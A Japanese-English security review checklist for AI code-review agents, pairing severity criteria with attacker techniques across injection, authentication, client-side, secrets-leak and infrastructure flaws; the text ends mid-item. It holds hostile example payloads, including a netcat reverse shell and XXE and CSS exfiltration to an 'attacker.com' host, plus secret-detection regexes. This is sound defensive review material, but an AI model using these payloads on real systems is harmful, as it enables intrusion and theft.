# Attack Criteria

attack-review エージェントが参照する攻撃チェックリスト。各エージェントは担当セクションを読み込み、該当する攻撃ベクターを調査する。
全チェックは**攻撃者の視点**で行う。「この防御は十分か？」ではなく「どうやって突破するか？」を問う。

## Risk Matrix

すべての発見は Likelihood x Impact で評価する。
**語彙の統一**: Likelihood / Impact / Risk Level はすべて `critical | high | medium | low` の 4 値で表現する（JSON 出力スキーマに合わせる）。

| | Impact: Low | Impact: Medium | Impact: High | Impact: Critical |
|---|---|---|---|---|
| **Likelihood: Critical** | Medium | High | Critical | Critical |
| **Likelihood: High**     | Low    | Medium | High     | Critical |
| **Likelihood: Medium**   | Low    | Medium | High     | High |
| **Likelihood: Low**      | Low    | Low    | Medium   | High |

- **Likelihood**: 攻撃の発見容易性 + 悪用容易性（ツールで自動化可能か、認証不要か、公開情報から推測可能か）
  - `critical`: trivially exploitable, automated tools detect it, no authentication needed
  - `high`: exploitable with moderate effort, publicly known technique
  - `medium`: requires specific conditions or insider knowledge
  - `low`: theoretical, requires significant effort or unusual conditions
- **Impact**: 被害の深刻度（RCE、データ漏洩、権限昇格、サービス停止、金銭的損失）
  - `critical`: full system compromise, mass data breach, RCE
  - `high`: significant data leak, privilege escalation, account takeover
  - `medium`: limited data exposure, service disruption, single-user impact
  - `low`: information disclosure with minimal sensitivity, minor inconvenience

---

## Agent 1: Injection Hunter — インジェクション攻撃専門 (server)

サーバーサイドで外部入力が内部コマンド・クエリ・テンプレートに到達する経路を追跡し、注入可能なポイントを特定する。

### Check Items

#### 1-1. SQL Injection (SQLi)

- **WHAT**: ユーザー入力が SQL 文に文字列結合で埋め込まれている箇所
- **WHERE**: ORM の `raw()` / `execute()` / `query()` 呼び出し、SQL テンプレートリテラル、ストアドプロシージャ呼び出し
- **HOW TO EXPLOIT**: `' OR 1=1 --`, UNION-based extraction, blind SQLi (time-based / boolean-based), second-order SQLi (保存された値が後続クエリで注入される)
- **WHY DANGEROUS**: DB 全データの抽出・改竄・削除、認証バイパス、場合によっては OS コマンド実行 (`xp_cmdshell`, `LOAD_FILE`)
- **SEVERITY**:
  - Critical: パラメータ化されていない動的 SQL でユーザー入力が直接到達する
  - High: ORM の raw クエリで部分的にエスケープされているが回避可能
  - Medium: ストアドプロシージャ経由で間接的に到達する
  - Low: 入力に型制約があり注入が困難（整数のみ等）

#### 1-2. Command Injection / OS Command Injection

- **WHAT**: ユーザー入力がシェルコマンドに渡される箇所
- **WHERE**: `child_process.exec()`, `os.system()`, `subprocess.Popen(shell=True)`, backtick execution, `Runtime.exec()`, `system()`, `popen()`
- **HOW TO EXPLOIT**: `; cat /etc/passwd`, `$(whoami)`, `| nc attacker.com 4444 -e /bin/sh`, newline injection, argument injection (`--output=/etc/cron.d/backdoor`)
- **WHY DANGEROUS**: Remote Code Execution (RCE)。サーバー完全掌握の直接経路
- **SEVERITY**:
  - Critical: `exec()` / `system()` にユーザー入力が到達し、サニタイズなし
  - High: 入力は部分的にフィルタされているが、代替文字 (`\n`, `\x00`, Unicode normalization) で回避可能
  - Medium: 引数インジェクション（コマンド自体は固定だがフラグを操作可能）
  - Low: ホワイトリスト検証あり、ただし不完全な可能性

#### 1-3. Server-Side Request Forgery (SSRF)

- **WHAT**: ユーザーが指定した URL / ホスト名をサーバーが取得する箇所
- **WHERE**: HTTP クライアント呼び出し (`fetch`, `requests.get`, `HttpClient`), URL パラメータ, Webhook URL 設定, ファイルインポート（URL 指定）
- **HOW TO EXPLOIT**: `http://169.254.169.254/latest/meta-data/` (クラウドメタデータ), `http://localhost:6379/` (内部サービス), `file:///etc/passwd`, DNS rebinding, URL パーサーの差異を利用したバイパス (`http://evil.com@localhost/`)
- **WHY DANGEROUS**: クラウド認証情報の窃取 (IAM role credentials)、内部ネットワークのスキャン・攻撃、ファイル読み取り
- **SEVERITY**:
  - Critical: URL がユーザー入力から直接構築され、allowlist なし、クラウド環境
  - High: URL バリデーションあるが DNS rebinding / URL パーサー差異で回避可能
  - Medium: プロトコル制限 (http/https のみ) はあるが内部 IP への到達が可能
  - Low: allowlist あり、ただし正規表現が不完全

#### 1-4. Path Traversal / Local File Inclusion (LFI)

- **WHAT**: ユーザー入力がファイルパスに使われる箇所
- **WHERE**: `fs.readFile()`, `open()`, `include()`, ファイルアップロードの保存先パス、テンプレートファイルの動的選択
- **HOW TO EXPLOIT**: `../../../etc/passwd`, `....//....//etc/passwd` (フィルタバイパス), `%2e%2e%2f` (URL エンコーディング), null byte injection (`%00`), Windows UNC パス (`\\attacker\share`)
- **WHY DANGEROUS**: ソースコード漏洩、設定ファイル (`.env`, `config.json`) の読み取り、LFI → RCE (ログファイルへの注入 + include)
- **SEVERITY**:
  - Critical: ファイルパスにユーザー入力が直接使われ、`../` フィルタなし
  - High: フィルタあるが正規化前にチェックしている（二重エンコーディングで回避可能）
  - Medium: chroot / ベースパス制限あるが、シンボリックリンク経由で脱出可能
  - Low: ホワイトリスト方式だが、リストの管理が不完全

#### 1-5. Server-Side Template Injection (SSTI)

- **WHAT**: ユーザー入力がテンプレートエンジンに渡される箇所
- **WHERE**: Jinja2 `render_template_string()`, Twig, Freemarker, Velocity, ERB, Pug/Jade の動的テンプレート生成
- **HOW TO EXPLOIT**: `{{7*7}}` → `49` で検出、`{{config.items()}}` (Jinja2), `${Runtime.getRuntime().exec("id")}` (Freemarker), `#{system("id")}` (ERB)
- **WHY DANGEROUS**: RCE。テンプレートエンジンのサンドボックス脱出でサーバー完全掌握
- **SEVERITY**:
  - Critical: `render_template_string(user_input)` のように入力がテンプレートとして解釈される
  - High: テンプレートの一部（変数名、フィルタ名）にユーザー入力が到達する
  - Medium: サンドボックスモードが有効だが、既知の脱出テクニックが存在するバージョン
  - Low: テンプレート文字列は固定で、データのみがユーザー入力

#### 1-6. XML External Entity (XXE)

- **WHAT**: XML パーサーが外部エンティティを解決する設定になっている箇所
- **WHERE**: XML パーサー (`DocumentBuilder`, `SAXParser`, `lxml.etree`, `xml.etree`), SOAP エンドポイント, SVG アップロード, XLSX/DOCX 処理
- **HOW TO EXPLOIT**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, OOB-XXE (`<!ENTITY xxe SYSTEM "http://attacker.com/?data=...">`)、Billion Laughs DoS
- **WHY DANGEROUS**: ファイル読み取り、SSRF、DoS
- **SEVERITY**:
  - Critical: 外部エンティティが有効な XML パーサーでユーザー XML を処理
  - High: DTD 処理が有効（パラメータエンティティ経由での攻撃が可能）
  - Medium: パーサーは制限されているが SVG / Office ファイル経由で XML が到達
  - Low: XML パーサーの設定は安全だが、文書化されていない

#### 1-7. LDAP Injection

- **WHAT**: ユーザー入力が LDAP クエリに文字列結合で埋め込まれる箇所
- **WHERE**: LDAP 認証、ディレクトリ検索、Active Directory 連携
- **HOW TO EXPLOIT**: `*)(uid=*))(|(uid=*` で全ユーザー列挙、`*)(userPassword=*)` で属性抽出
- **WHY DANGEROUS**: 認証バイパス、ディレクトリ情報の不正取得
- **SEVERITY**:
  - Critical: LDAP フィルタにユーザー入力が直接結合され、エスケープなし
  - High: 部分的なエスケープがあるが特殊文字の処理が不完全
  - Medium: LDAP ライブラリのパラメータ化 API を使っているが一部手動構築
  - Low: 読み取り専用 LDAP バインドで影響が限定的

#### 1-8. Header Injection / HTTP Response Splitting

- **WHAT**: ユーザー入力が HTTP ヘッダーに反映される箇所
- **WHERE**: `Location` ヘッダー (リダイレクト)、`Set-Cookie`、カスタムヘッダー、メール送信の `To` / `Subject`
- **HOW TO EXPLOIT**: `\r\n` で改行を注入し、任意のヘッダーを追加、レスポンスボディを注入 (HTTP Response Splitting)、メールヘッダーインジェクション (`\nBcc: attacker@evil.com`)
- **WHY DANGEROUS**: XSS (レスポンスボディ注入)、キャッシュポイズニング、セッション固定、スパムメール送信
- **SEVERITY**:
  - Critical: `\r\n` がフィルタされずヘッダーに到達する
  - High: 一部のフレームワークが CRLF を除去するが、古いバージョンでは不完全
  - Medium: ヘッダー値はエンコードされるが、特定のプロキシ構成で問題が発生
  - Low: モダンフレームワークが自動的にサニタイズするが、カスタムヘッダー処理は未検証

### Language-Agnostic Patterns (共通パターン)

An attacker would look for these universal anti-patterns regardless of language:

```
# String concatenation in queries (any language)
"SELECT * FROM users WHERE id = " + userInput
f"SELECT * FROM users WHERE id = {user_id}"
`SELECT * FROM users WHERE id = ${req.params.id}`

# Unsanitized shell execution
exec("convert " + filename)
os.system("ping " + host)
subprocess.run(f"nmap {target}", shell=True)

# URL from user input without allowlist
fetch(req.body.url)
requests.get(user_provided_url)
HttpClient.GetAsync(webhookUrl)

# File path from user input
open(f"uploads/{filename}")
fs.readFile(path.join(uploadDir, req.params.name))

# Template rendering with user input
render_template_string(user_input)
Template(user_input).render()
```

---

## Agent 2: AuthN/AuthZ Breaker — 認証・認可突破専門 (both)

認証をバイパスし、他人のリソースにアクセスし、権限を昇格する経路を探す。

### Check Items

#### 2-1. Authentication Bypass

- **WHAT**: 認証チェックを迂回できる経路
- **WHERE**: 認証ミドルウェア / ガード、ログインエンドポイント、パスワードリセットフロー、API 認証、OAuth/OIDC 実装
- **HOW TO EXPLOIT**:
  - ルートの認証ミドルウェア適用漏れ（新規エンドポイントに `@login_required` がない）
  - HTTP メソッド切り替え（`GET` は認証必須だが `POST` / `PUT` は未保護）
  - パスの正規化差異（`/admin` は保護だが `/admin/` や `/Admin` や `/%61dmin` は未保護）
  - デフォルト / テスト用クレデンシャル（`admin:admin`, `test:test`）の残存
  - パスワードリセットトークンの予測可能性（タイムスタンプベース、短いトークン）
  - レート制限なしのブルートフォース
- **WHY DANGEROUS**: 任意のアカウントへの不正アクセス、管理者権限の奪取
- **SEVERITY**:
  - Critical: 認証なしで管理者エンドポイントにアクセス可能
  - High: パスワードリセットトークンが予測可能、レート制限なしのログイン
  - Medium: テスト用クレデンシャルの残存、ロックアウト機構の不在
  - Low: パスワードポリシーが弱い（最小文字数のみ）

#### 2-2. Insecure Direct Object Reference (IDOR)

- **WHAT**: リソースアクセス時に所有権チェックが欠如している箇所
- **WHERE**: `/api/users/{id}`, `/api/orders/{orderId}`, `/api/documents/{docId}`, ファイルダウンロードエンドポイント
- **HOW TO EXPLOIT**:
  - ID をインクリメント (`/api/users/1001` → `/api/users/1002`)
  - UUID であっても、レスポンス内の他ユーザーの UUID をリーク箇所から収集
  - GraphQL の `node(id: "...")` クエリで任意ノードへアクセス
  - バッチ API で他人の ID を混入 (`[1001, 1002, 9999]`)
- **WHY DANGEROUS**: 他ユーザーのデータ閲覧・変更・削除
- **SEVERITY**:
  - Critical: 連番 ID + 所有権チェックなし + 機密データ（個人情報、決済情報）
  - High: UUID だが所有権チェックなし + 機密データ
  - Medium: 所有権チェックあるが特定の API パス（一覧 / エクスポート）で漏れ
  - Low: 公開データのみ、ただし列挙可能

#### 2-3. Privilege Escalation

- **WHAT**: 低権限ユーザーが高権限操作を実行できる経路
- **WHERE**: ロール / 権限チェックロジック、管理者 API、ユーザープロフィール更新
- **HOW TO EXPLOIT**:
  - リクエストボディで `role: "admin"` を送信（mass assignment）
  - フロントエンドで非表示にしているだけの管理者 API を直接呼び出す
  - 権限チェックがフロントエンドのみ（バックエンドは無検証）
  - トークンの `role` クレームをクライアント側で改竄
  - パス操作で別テナントのリソースにアクセス
- **WHY DANGEROUS**: 管理者権限の奪取、テナント間データ漏洩
- **SEVERITY**:
  - Critical: 一般ユーザーが管理者 API を実行可能（バックエンド検証なし）
  - High: ロールチェックはあるがバイパス可能（例: 条件分岐の論理エラー）
  - Medium: 水平権限昇格（同レベルの他ユーザーのリソース操作）
  - Low: 権限昇格の影響が限定的（表示のみの管理画面等）

#### 2-4. JWT Weaknesses

- **WHAT**: JWT の生成・検証における脆弱性
- **WHERE**: JWT ライブラリの使用箇所、トークン生成・検証ロジック、ミドルウェア
- **HOW TO EXPLOIT**:
  - **Algorithm confusion**: `alg: "none"` で署名検証をスキップ、`HS256` と `RS256` の混同（公開鍵を HMAC シークレットとして使用）
  - **Secret brute force**: 短い / 辞書攻撃可能なシークレット (`secret`, `password123`)
  - **Missing expiry**: `exp` クレームなし → トークンが永続的に有効
  - **Missing audience/issuer validation**: 別サービスのトークンを流用
  - **Kid injection**: `kid` ヘッダーに SQLi / Path Traversal を注入
  - **JWK injection**: `jwk` / `jku` ヘッダーで攻撃者の公開鍵を指定
- **WHY DANGEROUS**: 任意ユーザーへのなりすまし、永続的なセッションハイジャック
- **SEVERITY**:
  - Critical: `alg: "none"` を受け入れる、シークレットが推測可能
  - High: `exp` なし、audience 未検証、`kid` インジェクション可能
  - Medium: トークンの有効期間が過度に長い（24h+）、リフレッシュトークンの回転なし
  - Low: JWT ライブラリのバージョンが古い（既知の脆弱性の可能性）

#### 2-5. Session Management Flaws

- **WHAT**: セッション管理の不備
- **WHERE**: セッション生成、Cookie 設定、ログアウト処理、パスワード変更処理
- **HOW TO EXPLOIT**:
  - **Session fixation**: ログイン前後でセッション ID が変わらない → 攻撃者が事前にセッション ID をセット
  - **Weak session ID generation**: 予測可能な乱数生成器（`Math.random()`, タイムスタンプベース）
  - **Missing invalidation**: ログアウト後もセッションがサーバー側で有効、パスワード変更後も既存セッションが継続
  - **Concurrent sessions**: セッション数の上限なし → 窃取されたセッションの検知困難
- **WHY DANGEROUS**: セッションハイジャック、アカウント乗っ取りの永続化
- **SEVERITY**:
  - Critical: セッション固定 + ログイン前後で ID 不変
  - High: ログアウトでサーバー側セッションが破棄されない
  - Medium: パスワード変更後に既存セッションが無効化されない
  - Low: セッションタイムアウトが過度に長い

#### 2-6. OAuth / OpenID Connect Misconfiguration

- **WHAT**: OAuth フローの実装不備
- **WHERE**: OAuth 認可エンドポイント、コールバック URL、トークン交換
- **HOW TO EXPLOIT**:
  - **Open redirect via redirect_uri**: `redirect_uri=https://attacker.com` でアクセストークンを窃取
  - **Missing state parameter**: CSRF で被害者のアカウントに攻撃者の OAuth アカウントを紐付け
  - **Authorization code replay**: 使用済みコードの再利用
  - **Scope escalation**: 追加スコープを要求して過剰な権限を取得
  - **PKCE なしの public client**: Authorization code interception
- **WHY DANGEROUS**: アカウント乗っ取り、アクセストークンの窃取
- **SEVERITY**:
  - Critical: `redirect_uri` の検証なし（任意ドメインへリダイレクト可能）
  - High: `state` パラメータなし、PKCE なしの SPA
  - Medium: `redirect_uri` がサブドメインレベルでのみ検証（オープンリダイレクトとの組み合わせ）
  - Low: スコープの過剰付与（実使用より広い権限）

#### 2-7. Cookie Security

- **WHAT**: Cookie のセキュリティ属性の不備
- **WHERE**: `Set-Cookie` ヘッダー、セッション Cookie、認証トークン Cookie
- **HOW TO EXPLOIT**:
  - `HttpOnly` なし → XSS で `document.cookie` 経由でセッション窃取
  - `Secure` なし → HTTP 通信で Cookie が平文送信（MITM で窃取）
  - `SameSite=None` + `Secure` なし → CSRF に脆弱
  - Cookie の `Path` / `Domain` が過度に広い → サブドメインの脆弱なアプリ経由で窃取
- **WHY DANGEROUS**: セッションハイジャック、CSRF
- **SEVERITY**:
  - Critical: セッション Cookie に `HttpOnly` なし + XSS が存在
  - High: `Secure` フラグなし（本番環境で HTTP が有効）
  - Medium: `SameSite` 未設定（ブラウザデフォルトに依存）
  - Low: `Domain` 属性が過度に広い

---

## Agent 3: Client Attack Specialist — クライアントサイド攻撃専門 (client)

ブラウザ / クライアント環境で動作する攻撃ベクターを網羅的に調査する。

### Check Items

#### 3-1. Cross-Site Scripting (XSS)

- **WHAT**: ユーザー入力がサニタイズなしで HTML / JavaScript コンテキストに出力される箇所
- **WHERE**: テンプレートレンダリング、API レスポンスの DOM 挿入、エラーメッセージ表示

##### 3-1a. Reflected XSS

- **HOW TO EXPLOIT**: URL パラメータ / フォーム入力が直接 HTML に反映 (`<script>alert(1)</script>`, `" onmouseover="alert(1)`, `javascript:alert(1)`)
- **SEVERITY**:
  - Critical: WAF なし + Cookie に HttpOnly なし → セッションハイジャックの完全経路
  - High: 出力箇所が HTML 属性内 / JavaScript コンテキスト内
  - Medium: CSP が存在するが `unsafe-inline` 許可
  - Low: self-XSS のみ（他ユーザーに影響を与える配信経路がない）

##### 3-1b. Stored XSS

- **HOW TO EXPLOIT**: コメント、プロフィール、ファイル名などに永続的にスクリプトを保存。閲覧した全ユーザーに発火
- **SEVERITY**:
  - Critical: 管理者が閲覧する画面で発火 → 管理者権限の奪取
  - High: 一般ユーザー間で伝播（コメント、メッセージ）
  - Medium: 限定的なコンテキストでのみ発火（特定画面のみ）
  - Low: マークダウンレンダラーの不備だが CSP で実行が阻止される

##### 3-1c. DOM-based XSS

- **WHAT**: クライアントサイド JavaScript が DOM を操作する際に発生する XSS
- **SOURCES** (攻撃者が制御可能な入力):
  - `location.hash`, `location.search`, `location.href`
  - `document.referrer`
  - `window.name`
  - `postMessage` のデータ
  - `localStorage` / `sessionStorage` の値
  - `document.cookie`
- **SINKS** (危険な出力先):
  - `innerHTML`, `outerHTML`, `insertAdjacentHTML`
  - `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`
  - `document.write()`, `document.writeln()`
  - `element.src`, `element.href` (特に `javascript:` プロトコル)
  - `jQuery.html()`, `$.append()`, `v-html`, `dangerouslySetInnerHTML`
- **HOW TO EXPLOIT**: Source から Sink への追跡。フレームワークの安全なバインディング (`{{}}`, `{}`) をバイパスする `v-html`, `dangerouslySetInnerHTML` の誤用
- **SEVERITY**:
  - Critical: `eval(location.hash.slice(1))` のような直接経路
  - High: `innerHTML = data` で `data` がユーザー制御可能
  - Medium: 中間処理でサニタイズされるが不完全（`<img onerror=...>` を通す等）
  - Low: Source が限定的（`window.name` のみ等）で発火条件が厳しい

#### 3-2. Cross-Site Request Forgery (CSRF)

- **WHAT**: 認証済みユーザーの意図しない操作を強制する攻撃
- **WHERE**: 状態変更を行う全エンドポイント（POST / PUT / DELETE / PATCH）
- **HOW TO EXPLOIT**:
  - CSRF トークンの欠如 → `<form action="target.com/transfer" method="POST">` で自動送信
  - `SameSite` Cookie 未設定 + CSRF トークンなし → クロスサイトからのリクエストに Cookie が付与
  - **GET で状態変更**: `<img src="target.com/api/delete?id=123">` で画像タグ経由で実行
  - JSON API でも CSRF は成立: `Content-Type: text/plain` でプリフライトを回避
  - Flash / PDF 経由の CSRF（レガシー環境）
- **WHY DANGEROUS**: パスワード変更、送金、アカウント設定変更を被害者の権限で実行
- **SEVERITY**:
  - Critical: 送金 / パスワード変更 / メールアドレス変更に CSRF 保護なし
  - High: 管理者操作（ユーザー削除、権限変更）に CSRF 保護なし
  - Medium: プロフィール更新など中程度の影響の操作に保護なし
  - Low: 影響の小さい操作（テーマ変更等）に保護なし

#### 3-3. DOM Clobbering

- **WHAT**: HTML 要素の `id` / `name` 属性でグローバル変数を上書きする攻撃
- **WHERE**: `document.getElementById` の結果を信頼するコード、名前付きプロパティのフォールバック参照
- **HOW TO EXPLOIT**: `<img id="isAdmin" src="x">` を注入すると `window.isAdmin` が truthy になる。`<form id="config"><input name="apiUrl" value="https://attacker.com"></form>` でオブジェクトプロパティを偽装
- **WHY DANGEROUS**: セキュリティチェックのバイパス、設定値の改竄
- **SEVERITY**:
  - Critical: セキュリティ判定に使われる変数が clobber 可能
  - High: API エンドポイント URL や設定値が clobber 可能
  - Medium: UI 表示のみに影響
  - Low: 実際に注入可能な HTML コンテキストが限定的

#### 3-4. Prototype Pollution

- **WHAT**: JavaScript オブジェクトの `__proto__` / `constructor.prototype` を汚染する攻撃
- **WHERE**: `Object.assign()`, lodash `merge` / `set` / `defaultsDeep`, JSON パーサーの出力を直接マージ、クエリパラメータのパーサー
- **HOW TO EXPLOIT**: `{"__proto__": {"isAdmin": true}}` を送信、`?__proto__[isAdmin]=true` をクエリパラメータで送信
- **WHY DANGEROUS**: 全オブジェクトに属性を注入 → 認証バイパス、XSS（テンプレートエンジンでの悪用）、RCE（`child_process` のオプション汚染）
- **SEVERITY**:
  - Critical: Prototype pollution → RCE（`child_process.spawn` のオプションを汚染）
  - High: Prototype pollution → 認証バイパス / XSS
  - Medium: 汚染は成立するが悪用可能な Sink が見つからない
  - Low: サーバーサイドでは影響があるがクライアントのみで影響が限定的

#### 3-5. Open Redirect

- **WHAT**: ユーザーを攻撃者のサイトにリダイレクトする脆弱性
- **WHERE**: ログイン後のリダイレクト (`?next=`, `?redirect=`, `?return_url=`), OAuth の `redirect_uri`
- **HOW TO EXPLOIT**: `https://target.com/login?next=https://attacker.com`, `//attacker.com`, `\/\/attacker.com`, `https://target.com@attacker.com`, `javascript:alert(1)`
- **WHY DANGEROUS**: フィッシング（正規ドメインから遷移するため信頼されやすい）、OAuth トークンの窃取
- **SEVERITY**:
  - Critical: OAuth フローの `redirect_uri` がオープンリダイレクト可能
  - High: ログインページからの任意 URL リダイレクト
  - Medium: リダイレクト先がサブドメインに制限されるが、脆弱なサブドメインが存在
  - Low: リダイレクト先がホワイトリスト方式だが一覧が広すぎる

#### 3-6. Clickjacking

- **WHAT**: 透明な iframe でターゲットサイトを重ね、ユーザーのクリックを奪う攻撃
- **WHERE**: 状態変更を行うボタン（削除、承認、送金）がある画面
- **HOW TO EXPLOIT**: `X-Frame-Options` / CSP `frame-ancestors` が未設定 → iframe で読み込み可能 → 透明な iframe 上にボタンを配置
- **WHY DANGEROUS**: ユーザーの意図しない操作（削除確認のクリック、権限付与の承認等）
- **SEVERITY**:
  - Critical: ワンクリックで危険な操作が完了する画面（2段階確認なし）が iframe 可能
  - High: 管理者画面が iframe 可能
  - Medium: `X-Frame-Options` あるが `ALLOW-FROM` で広いドメインを許可
  - Low: iframe 可能だが状態変更操作がない画面のみ

#### 3-7. postMessage Abuse

- **WHAT**: `window.postMessage` の origin 検証不備
- **WHERE**: `addEventListener("message", handler)` のハンドラー
- **HOW TO EXPLOIT**:
  - `event.origin` の検証なし → 攻撃者の iframe からメッセージを送信
  - `event.origin.indexOf("trusted.com")` のような不完全な検証 → `attacker-trusted.com` で回避
  - 受信データを `innerHTML` や `eval` に渡す → DOM XSS
- **WHY DANGEROUS**: XSS 相当の攻撃を iframe 間通信経由で実行
- **SEVERITY**:
  - Critical: origin 検証なし + 受信データが `eval` / `innerHTML` に到達
  - High: origin 検証が不完全（部分文字列マッチ）
  - Medium: origin 検証あるが受信データのサニタイズが不十分
  - Low: メッセージの受信は確認されるが悪用可能な Sink がない

#### 3-8. CSS Injection

- **WHAT**: ユーザー入力が CSS コンテキストに注入される脆弱性
- **WHERE**: インラインスタイル、`<style>` タグ、CSS-in-JS のテンプレート
- **HOW TO EXPLOIT**: `background: url(https://attacker.com/steal?token=` + CSS attribute selectors で CSRF トークンを1文字ずつ抽出 (`input[value^="a"] { background: url(attacker.com/?a) }`)
- **WHY DANGEROUS**: CSRF トークンの窃取、UI 偽装（フィッシング）、データ抽出
- **SEVERITY**:
  - Critical: CSS injection + CSRF トークンが属性値にある → トークン抽出可能
  - High: 任意の CSS が注入可能（UI 偽装、キーロガー風の入力キャプチャ）
  - Medium: CSS の一部のみ制御可能
  - Low: サニタイズが存在するがバイパスの可能性

---

## Agent 4: Data & Secrets Exfiltrator — データ・機密情報窃取専門 (both)

システムから機密情報を抽出できる経路を探す。コードベース内のハードコード秘密、エラーメッセージからの情報漏洩、過剰なデータ公開を調査する。

### Check Items

#### 4-1. Hardcoded Secrets

- **WHAT**: ソースコード内にハードコードされた秘密情報
- **WHERE**: 設定ファイル、テストファイル、初期化コード、コメント、環境変数のデフォルト値
- **PATTERN MATCHING**:
  ```
  # AWS
  AKIA[0-9A-Z]{16}                          # AWS Access Key ID
  [0-9a-zA-Z/+]{40}                          # AWS Secret Access Key (near AKIA)

  # JWT / Bearer tokens
  eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+      # JWT token
  Bearer [A-Za-z0-9_\-\.]+                    # Bearer token

  # Private keys
  -----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----

  # API keys (generic patterns)
  ['\"]?[Aa][Pp][Ii][-_]?[Kk][Ee][Yy]['\"]?\s*[:=]\s*['\"][A-Za-z0-9_\-]{16,}['\"]
  ['\"]?[Ss][Ee][Cc][Rr][Ee][Tt]['\"]?\s*[:=]\s*['\"][^\s'"]{8,}['\"]

  # Database URIs
  (postgres|mysql|mongodb|redis)://[^:]+:[^@]+@
  
  # Specific services
  sk-[A-Za-z0-9]{32,}                        # OpenAI API key
  ghp_[A-Za-z0-9]{36}                        # GitHub PAT
  xoxb-[0-9]+-[A-Za-z0-9]+                   # Slack Bot Token
  SG\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+        # SendGrid API key
  ```
- **WHY DANGEROUS**: 攻撃者がリポジトリにアクセスするだけで外部サービスの全権限を奪取
- **SEVERITY**:
  - Critical: 本番 API キー / データベースクレデンシャルがソースコードにハードコード
  - High: テスト用トークンだが本番環境でも有効、プライベートキーのコミット
  - Medium: `.env.example` に実際の値が残存、コメント内のクレデンシャル
  - Low: ダミー値だが本物のフォーマットに従っており混同リスクがある

#### 4-2. Error Message Information Leakage

- **WHAT**: エラーメッセージやレスポンスから内部情報が漏洩する箇所
- **WHERE**: 例外ハンドラー、API エラーレスポンス、ログ出力、デバッグモード
- **HOW TO EXPLOIT**:
  - スタックトレースからフレームワーク、バージョン、内部パス構造を特定
  - SQL エラーメッセージからテーブル名、カラム名、クエリ構造を抽出
  - バリデーションエラーから存在するフィールド名 / 型を推測
  - 404 / 403 の差分からリソースの存在を確認（user enumeration）
- **WHY DANGEROUS**: 攻撃の偵察フェーズを大幅に短縮。内部構造の把握 → 的確な攻撃
- **SEVERITY**:
  - Critical: SQL クエリ全文、内部 IP アドレス、クレデンシャルがエラーメッセージに含まれる
  - High: フルスタックトレース（フレームワーク + バージョン + ファイルパス）が外部に露出
  - Medium: フレームワークのデフォルトエラーページ（Django debug, Express stack trace）が本番で有効
  - Low: フィールドバリデーションメッセージが内部スキーマを示唆

#### 4-3. PII in Logs

- **WHAT**: 個人識別情報（PII）がログに記録される箇所
- **WHERE**: アクセスログ、アプリケーションログ、監査ログ、APM / トレース
- **HOW TO EXPLOIT**: ログ収集システムへのアクセス権を取得した攻撃者が PII を大量抽出。ログの保持期間が長い場合、過去の全データが漏洩
- **PATTERNS**:
  ```
  console.log(req.body)           # リクエストボディ全体（パスワード含む可能性）
  logger.info(f"User: {user}")    # User オブジェクト全体（email, phone 含む）
  log.debug("Token: " + token)    # 認証トークンのログ出力
  ```
- **WHY DANGEROUS**: GDPR / 個人情報保護法違反、ログ経由のクレデンシャル漏洩
- **SEVERITY**:
  - Critical: パスワード / 認証トークンがログに出力される
  - High: クレジットカード番号、SSN などの機密 PII がログに出力される
  - Medium: メールアドレス、電話番号がログに出力される
  - Low: IP アドレスのみ（ただし GDPR では PII 扱い）

#### 4-4. Excessive Data in API Responses

- **WHAT**: API レスポンスに必要以上のデータが含まれる箇所
- **WHERE**: ユーザー情報 API、一覧 API、GraphQL クエリ
- **HOW TO EXPLOIT**:
  - `/api/users/me` がパスワードハッシュ、内部 ID、管理者フラグを含む
  - GraphQL の introspection で全スキーマを取得 → 隠しフィールドを発見
  - 一覧 API にページネーションがなく全件取得可能
  - `?include=password_hash,secret_key` のようなフィールド指定パラメータ
- **WHY DANGEROUS**: 不要なデータ露出 → 攻撃の足がかり、PII 漏洩
- **SEVERITY**:
  - Critical: パスワードハッシュ / 内部シークレットがレスポンスに含まれる
  - High: 他ユーザーの PII が一覧 API で取得可能
  - Medium: GraphQL introspection が本番で有効
  - Low: 不要な内部フィールド（`created_by_ip` 等）が含まれる

#### 4-5. Exposed Files and Directories

- **WHAT**: 公開されるべきでないファイルやディレクトリがアクセス可能
- **WHERE**: Web サーバーの公開ディレクトリ、静的ファイル配信設定
- **HOW TO EXPLOIT**:
  - `/.git/HEAD` → リポジトリの完全復元 (`git-dumper`)
  - `/.env` → 環境変数（DB クレデンシャル等）の直接取得
  - `/backup.sql`, `/dump.sql` → データベースダンプ
  - `/.DS_Store` → ディレクトリ構造の推測
  - `/server-status`, `/debug`, `/phpinfo.php` → サーバー情報の取得
  - `/swagger-ui/`, `/api-docs/` → API 仕様の取得（認証なし）
  - `/*.map` → ソースマップからソースコード復元
- **WHY DANGEROUS**: ソースコード全体の漏洩、データベースの完全ダンプ、クレデンシャルの直接取得
- **SEVERITY**:
  - Critical: `.git` ディレクトリまたは `.env` ファイルが公開
  - High: データベースダンプ / バックアップファイルが公開
  - Medium: ソースマップが公開、Swagger UI が認証なしで公開
  - Low: ディレクトリリスティングが有効（直接的な機密漏洩なし）

#### 4-6. Source Map Leaks

- **WHAT**: 本番環境でソースマップが公開されている
- **WHERE**: JavaScript / CSS のビルド出力、`//# sourceMappingURL=` コメント
- **HOW TO EXPLOIT**: `.js.map` ファイルをダウンロード → 元のソースコード（TypeScript / JSX 含む）を完全復元 → ビジネスロジック、API エンドポイント、バリデーションルールを把握
- **WHY DANGEROUS**: フロントエンドの完全な逆アセンブリ → 攻撃対象の特定が容易に
- **SEVERITY**:
  - Critical: ソースマップにサーバーサイドのシークレットが含まれている（SSR ビルド）
  - High: ソースマップから認証ロジック / API キーの使用パターンが判明
  - Medium: ビジネスロジックが完全に復元可能
  - Low: ソースマップは存在するが有用な情報が限定的

---

## Agent 5: Infra & Supply Chain Exploiter — インフラ・サプライチェーン攻撃専門 (both)

設定不備、依存関係の脆弱性、CI/CD パイプラインの弱点を突いてシステムを侵害する経路を探す。

### Check Items

#### 5-1. CORS Misconfiguration

- **WHAT**: Cross-Origin Resource Sharing の設定不備
- **WHERE**: `Access-Control-Allow-Origin` ヘッダー、CORS ミドルウェア設定
- **HOW TO EXPLOIT**:
  - `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` （ブラウザは拒否するが古いバージョンで動作する場合あり）
